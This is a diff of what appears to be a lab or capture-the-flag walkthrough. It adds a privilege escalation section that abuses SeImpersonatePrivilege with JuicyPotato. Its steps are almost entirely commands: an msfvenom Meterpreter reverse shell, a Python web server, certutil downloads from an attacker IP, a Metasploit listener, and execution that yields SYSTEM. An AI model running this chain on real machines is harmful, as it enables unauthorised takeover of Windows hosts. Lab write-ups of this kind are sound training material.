@@ -54,9 +54,49 @@ I changed some configuration inside the file and I got the shell:
 
 ![image](https://github.com/user-attachments/assets/0ad09701-8968-4c4c-9f45-80530f2a3e6b)
 
-## Privile Escalation
+## Privilege Escalation
 
+### 1. Token Impersonation via JuicyPotato
+#### Initial Findings
+Checking privileges revealed `SeImpersonatePrivilege` enabled:
+```bash
+whoami /priv
+```
 
+#### Exploitation
+1. **Download JuicyPotato** on your local machine:
+   ```bash
+   wget "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+   ```
+2. **Generate a Meterpreter Reverse Shell**:
+   ```bash
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=8887 -f exe -o shell.exe
+   ```
+3. **Start a Web Server**:
+   ```bash
+   python3 -m http.server 8081
+   ```
+4. **Transfer Exploits to the Target**:
+   ```bash
+   cd %TEMP%
+   certutil -UrlCache -f http://<IP>:8081/JuicyPotato.exe JuicyPotato.exe
+   certutil -UrlCache -f http://<IP>:8081/shell.exe shell.exe
+   ```
+5. **Start Listener**:
+   ```bash
+   msfconsole
+   use exploit/multi/handler
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set LHOST <your_IP>
+   set LPORT 8887
+   run
+   ```
+6. **Run JuicyPotato**:
+   ```bash
+   .\JuicyPotato.exe -t * -p shell.exe -l 443
+   ```
+
+**Outcome**: Obtained a Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.
 
 ```
 certutil -UrlCache -f http://10.10.16.9:8081/JuicyPotato.exe jp.exe
